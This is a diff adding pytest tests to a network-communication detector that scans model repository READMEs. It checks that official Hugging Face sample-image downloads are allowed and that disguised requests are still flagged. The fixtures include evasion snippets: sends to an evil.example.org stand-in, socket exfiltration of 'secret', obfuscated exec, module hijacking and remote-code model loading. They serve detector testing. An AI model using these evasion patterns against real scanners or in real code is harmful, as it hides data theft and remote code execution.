@@ -2,6 +2,7 @@
 
 import json
 import os
+import re
 from collections.abc import Iterator
 from pathlib import Path
 from urllib.parse import quote, urlparse
@@ -2763,6 +2764,386 @@ class TestNetworkCommDetector:
         findings = detector.scan(data, "model_card.md")
 
         assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+
+    @pytest.mark.parametrize(
+        "image_url",
+        [
+            "https://huggingface.co/spaces/ds4sd/demo/resolve/main/examples/sample.png",
+            "https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/car.jpg?download=true",
+            "https://HuggingFace.CO/spaces/ds4sd/demo/resolve/main/examples/sample.png",
+        ],
+    )
+    @pytest.mark.parametrize("context", ["README.md", "README", "README.en.md", "README.markdown", "README.rst"])
+    def test_readme_python_example_official_sample_image_has_no_network_false_positive(
+        self,
+        image_url: str,
+        context: str,
+    ) -> None:
+        data = (
+            "# Model card\n\n```python\nimport requests\n"
+            f"image_url = {image_url!r}\n"
+            "image = Image.open(requests.get(image_url, stream=True).raw)\n```\n"
+        ).encode()
+
+        findings = NetworkCommDetector().scan(data, context)
+
+        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+        assert any(finding["type"] == "cloud_storage_url" for finding in findings)
+
+    @pytest.mark.parametrize(
+        ("opening", "closing"),
+        [("```", "````"), ("````", "````"), ("````", "`````"), ("~~~", "~~~~"), ("~~~~", "~~~~")],
+    )
+    def test_readme_python_example_accepts_valid_longer_fence_closers(self, opening: str, closing: str) -> None:
+        data = (
+            f"{opening}python\nimport requests\n"
+            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+            "requests.get(image_url, stream=True)\n"
+            f"{closing}\n"
+        ).encode()
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+
+    def test_readme_python_example_rejects_shorter_fence_closers(self) -> None:
+        data = (
+            b"````python\nimport requests\n"
+            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+            b"requests.get(image_url, stream=True)\n```\n"
+        )
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert any(finding["type"] == "network_library" for finding in findings)
+        assert any(finding["type"] == "network_function" for finding in findings)
+
+    def test_readme_python_example_accepts_constant_annotated_url_binding(self) -> None:
+        data = (
+            b"```python\nimport requests\n"
+            b"image_url: str = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+            b"requests.get(image_url, stream=True)\n```\n"
+        )
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+
+    @pytest.mark.parametrize(
+        "image_url",
+        [
+            "http://huggingface.co/org/model/resolve/main/sample.png",
+            "https://evil.example.org/sample.png",
+            "https://huggingface.co.evil.example.org/sample.png",
+            "https://hf.co/org/model/resolve/main/sample.png",
+            "https://huggingface.co/org/model/resolve/main/payload.py",
+            "https://huggingface.co/org/model/resolve/main/sample.png?next=https://evil.example.org/payload",
+        ],
+    )
+    def test_readme_python_example_preserves_untrusted_image_network_detection(
+        self,
+        image_url: str,
+    ) -> None:
+        data = (
+            "```python\nimport requests\n"
+            f"image_url = {image_url!r}\n"
+            "image = Image.open(requests.get(image_url, stream=True).raw)\n```\n"
+        ).encode()
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert any(finding["type"] == "network_library" for finding in findings)
+        assert any(finding["type"] == "network_function" for finding in findings)
+
+    def test_readme_python_example_preserves_mixed_untrusted_requests(self) -> None:
+        data = (
+            b"```python\nimport requests\n"
+            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+            b"requests.get(image_url, stream=True)\n"
+            b"requests.post('https://evil.example.org/upload')\n```\n"
+        )
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert any(finding["type"] == "network_library" for finding in findings)
+        assert any(finding["type"] == "network_function" for finding in findings)
+
+    @pytest.mark.parametrize(
+        "mutator",
+        [
+            "for image_url in [input()]:\n    requests.get(image_url, stream=True)",
+            "image_url: str = input()\nrequests.get(image_url, stream=True)",
+            "(image_url := input())\nrequests.get(image_url, stream=True)",
+            "def load(image_url):\n    requests.get(image_url, stream=True)",
+            "requests = payload\nrequests.get(image_url, stream=True)",
+            "requests.get(image_url)",
+            "requests.get(image_url, stream=True, proxies=payload)",
+            "requests.get = payload\nrequests.get(image_url, stream=True)",
+            "setattr(requests, 'get', payload)\nrequests.get(image_url, stream=True)",
+            "fetch = requests.get\nrequests.get(image_url, stream=True)\nfetch(input())",
+            "from requests import post\nrequests.get(image_url, stream=True)\npost(input())",
+            "import attacker as requests\nrequests.get(image_url, stream=True)",
+            "from attacker import requests\nrequests.get(image_url, stream=True)",
+            "from attacker import *\nrequests.get(image_url, stream=True)",
+            "vars(requests)['get'] = payload\nrequests.get(image_url, stream=True)",
+            "object.__setattr__(requests, 'get', payload)\nrequests.get(image_url, stream=True)",
+            "class requests:\n    get = payload\nrequests.get(image_url, stream=True)",
+            "import sys\nsys.modules['requests'] = payload\nrequests.get(image_url, stream=True)",
+            "fetch = __import__('requests').post\nrequests.get(image_url, stream=True)\nfetch(input())",
+            "match [payload]:\n    case [*requests]:\n        requests.get(image_url, stream=True)",
+            "match payload:\n    case {'x': _, **image_url}:\n        requests.get(image_url, stream=True)",
+            "@mutate\ndef placeholder():\n    pass\nrequests.get(image_url, stream=True)",
+            "class Hook(metaclass=mutate):\n    pass\nrequests.get(image_url, stream=True)",
+            (
+                "import importlib\nfetch = importlib.import_module('requests').post\n"
+                + "requests.get(image_url, stream=True)\nfetch(input())"
+            ),
+            "del requests\nrequests.get(image_url, stream=True)",
+            "del image_url\nrequests.get(image_url, stream=True)",
+            "requests.get(image_url, stream=True)\nmatch payload:\n    case image_url:\n        fetch(image_url)",
+            "builtins.exec('requests.get(input())')\nrequests.get(image_url, stream=True)",
+            "namespace['exec']('requests.get(input())')\nrequests.get(image_url, stream=True)",
+            "from attacker import endpoint as image_url\nrequests.get(image_url, stream=True)",
+            "import attacker as image_url\nrequests.get(image_url, stream=True)",
+            "replace_requests_get()\nrequests.get(image_url, stream=True)",
+            "from attacker import install_hook\ninstall_hook()\nrequests.get(image_url, stream=True)",
+            "__builtins__['ex' + 'ec']('requests.get(input())')\nrequests.get(image_url, stream=True)",
+            "import attacker\nrequests.get(image_url, stream=True)",
+            "import attacker\nattacker.install()\nrequests.get(image_url, stream=True)",
+            "import attacker as print\nprint()\nrequests.get(image_url, stream=True)",
+            "requests.get(image_url, stream=True)\nplugin.activate()",
+            "response = requests.get(image_url, stream=True)\nresponse.exfiltrate()",
+            "requests.get(image_url, stream=True).raw.exfiltrate()",
+            "requests.get(image_url, stream=True).raw.connection.sock.sendall(b'secret')",
+            "requests.get(image_url, stream=True).raw.connection.request('POST', '/upload', body='secret')",
+            "requests.get(image_url, stream=True).raw[0].send(image_url)",
+            "print.__self__.__dict__['ex' + 'ec']('requests.get = print')\nrequests.get(image_url, stream=True)",
+            (
+                "assert print.__self__.__dict__['ex' + 'ec']('requests.get = print') is None\n"
+                + "requests.get(image_url, stream=True)"
+            ),
+            "torch.ops.load_library('payload.so')\nrequests.get(image_url, stream=True)",
+            "torch.load('payload.pt', weights_only=False)\nrequests.get(image_url, stream=True)",
+            "torch.distributed.init_process_group('gloo')\nrequests.get(image_url, stream=True)",
+            "Image.open('payload.tif')\nrequests.get(image_url, stream=True)",
+            (
+                "from transformers import AutoModel\n"
+                "AutoModel.from_pretrained('attacker/model', trust_remote_code=True)\n"
+                "requests.get(image_url, stream=True)"
+            ),
+            "os = 1\nos.system('payload')\nrequests.get(image_url, stream=True)",
+            (
+                "response = requests.get(image_url, stream=True)\nalias = response\n"
+                "alias.raw.connection.sock.sendall(b'x')"
+            ),
+            "raw = requests.get(image_url, stream=True).raw\nraw.connection.sock.sendall(b'x')",
+            "with requests.get(image_url, stream=True) as response:\n    response.raw.connection.sock.sendall(b'x')",
+            "(response := requests.get(image_url, stream=True)).raw.connection.sock.sendall(b'x')",
+            "responses = [requests.get(image_url, stream=True)]\nresponses[0].raw.connection.sock.sendall(b'x')",
+            "(lambda: payload)()\nrequests.get(image_url, stream=True)",
+        ],
+    )
+    def test_readme_python_example_preserves_rebound_or_unproven_requests(
+        self,
+        mutator: str,
+    ) -> None:
+        data = (
+            "```python\nimport requests\n"
+            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+            f"{mutator}\n```\n"
+        ).encode()
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert any(finding["type"] == "network_library" for finding in findings)
+        assert any(finding["type"] == "network_function" for finding in findings)
+
+    @pytest.mark.parametrize(
+        "additional_fence",
+        [
+            "```python\n# requests powers our image download\nprint('ok')\n```\n",
+            "```python\nprint('this example uses requests')\n```\n",
+        ],
+    )
+    def test_readme_official_image_ignores_nonexecutable_requests_mentions(self, additional_fence: str) -> None:
+        data = (
+            "```python\nimport requests\n"
+            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+            "requests.get(image_url, stream=True)\n```\n"
+            f"{additional_fence}"
+        ).encode()
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+
+    @pytest.mark.parametrize("outside_request", ["requests.patch(input())\n", "```\nrequests.patch(input())\n```\n"])
+    def test_readme_official_image_preserves_requests_outside_validated_python_fence(
+        self,
+        outside_request: str,
+    ) -> None:
+        data = (
+            "```python\nimport requests\n"
+            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+            "requests.get(image_url, stream=True)\n```\n"
+            f"{outside_request}"
+        ).encode()
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert any(finding["type"] == "network_library" for finding in findings)
+
+    def test_official_sample_image_does_not_suppress_executable_python(self) -> None:
+        data = (
+            b"import requests\n"
+            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+            b"requests.get(image_url, stream=True)\n"
+        )
+
+        findings = NetworkCommDetector().scan(data, "example.py")
+
+        assert any(finding["type"] == "network_library" for finding in findings)
+        assert any(finding["type"] == "network_function" for finding in findings)
+
+    def test_readme_official_sample_image_requires_requests_import_before_call(self) -> None:
+        data = (
+            b"```python\n"
+            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+            b"requests.get(image_url, stream=True)\n"
+            b"import requests\n```\n"
+        )
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert any(finding["type"] == "network_library" for finding in findings)
+        assert any(finding["type"] == "network_function" for finding in findings)
+
+    def test_large_readme_keeps_bounded_official_sample_image_example(self) -> None:
+        data = (
+            (b"Documentation prose.\n" * 4000)
+            + b"```python\nimport requests\n"
+            + b"url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+            + b"requests.get(url, stream=True)\n```\n"
+        )
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+
+    def test_readme_official_image_example_is_validated_once_per_fence(
+        self,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        validated_examples: list[bytes] = []
+        original_validator = network_comm._is_valid_official_readme_sample_image_example
+
+        def count_validation(example: bytes) -> bool:
+            validated_examples.append(example)
+            return original_validator(example)
+
+        monkeypatch.setattr(network_comm, "_is_valid_official_readme_sample_image_example", count_validation)
+        data = (
+            b"```python\nimport requests\n"
+            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+            + b"# requests.get is documented here\n" * 64
+            + b"requests.get(image_url, stream=True)\n```\n"
+        )
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert len(validated_examples) == 1
+        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+
+    def test_readme_official_image_example_stops_at_bounded_ast_node_limit(
+        self,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        visited_nodes: list[int] = []
+
+        def oversized_ast_walk(_tree: network_comm.ast.AST) -> Iterator[network_comm.ast.AST]:
+            for index in range(network_comm._MAX_README_IMAGE_EXAMPLE_AST_NODES + 50):
+                visited_nodes.append(index)
+                yield network_comm.ast.Pass()
+
+        monkeypatch.setattr(network_comm.ast, "walk", oversized_ast_walk)
+
+        assert not network_comm._is_valid_official_readme_sample_image_example(
+            b"import requests\nrequests.get('https://huggingface.co/org/model/resolve/main/sample.png', stream=True)\n"
+        )
+        assert len(visited_nodes) == network_comm._MAX_README_IMAGE_EXAMPLE_AST_NODES + 1
+
+    def test_readme_official_image_example_rejects_excessive_fence_openings(
+        self,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        closing_searches: list[int] = []
+        original_pattern = network_comm._README_FENCE_END_PATTERN
+
+        class CountedClosingPattern:
+            def search(self, data: bytes, start: int, end: int) -> re.Match[bytes] | None:
+                closing_searches.append(start)
+                return original_pattern.search(data, start, end)
+
+        monkeypatch.setattr(network_comm, "_README_FENCE_END_PATTERN", CountedClosingPattern())
+        data = (
+            b"```python\n" * (network_comm._MAX_README_IMAGE_EXAMPLE_FENCE_OPENINGS + 1)
+            + b"import requests\nrequests.get(image_url, stream=True)\n"
+        )
+
+        assert not network_comm._is_official_readme_sample_image_request(
+            data,
+            match_index=data.index(b"requests.get"),
+            context="README.md",
+            fence_cache=[],
+        )
+        assert not closing_searches
+
+    def test_readme_official_image_in_different_fence_does_not_suppress_network_call(self) -> None:
+        data = (
+            b"```python\nimage_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n```\n"
+            b"```python\nimport requests\nrequests.get(image_url, stream=True)\n```\n"
+        )
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert any(finding["type"] == "network_library" for finding in findings)
+        assert any(finding["type"] == "network_function" for finding in findings)
+
+    def test_readme_official_image_does_not_suppress_requests_in_another_fence(self) -> None:
+        data = (
+            b"```python\nimport requests\n"
+            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+            b"requests.get(image_url, stream=True)\n```\n"
+            b"```python\nrequests.patch(input())\n```\n"
+        )
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert any(finding["type"] == "network_library" for finding in findings)
+
+    def test_readme_official_image_fence_index_stays_bounded(
+        self,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        validated_examples: list[bytes] = []
+        original_validator = network_comm._is_valid_official_readme_sample_image_example
+
+        def count_validation(example: bytes) -> bool:
+            validated_examples.append(example)
+            return original_validator(example)
+
+        monkeypatch.setattr(network_comm, "_is_valid_official_readme_sample_image_example", count_validation)
+        example = (
+            b"```python\nimport requests\n"
+            b"image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+            b"requests.get(image_url, stream=True)\n```\n"
+        )
+        data = example * (network_comm._MAX_README_IMAGE_EXAMPLE_FENCES + 1)
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert len(validated_examples) == network_comm._MAX_README_IMAGE_EXAMPLE_FENCES
+        assert any(finding["type"] == "network_library" for finding in findings)
 
     def test_network_function_with_parentheses_still_flagged_in_metadata_context(self) -> None:
         """Executable-looking calls should stay detectable even when embedded in metadata files."""
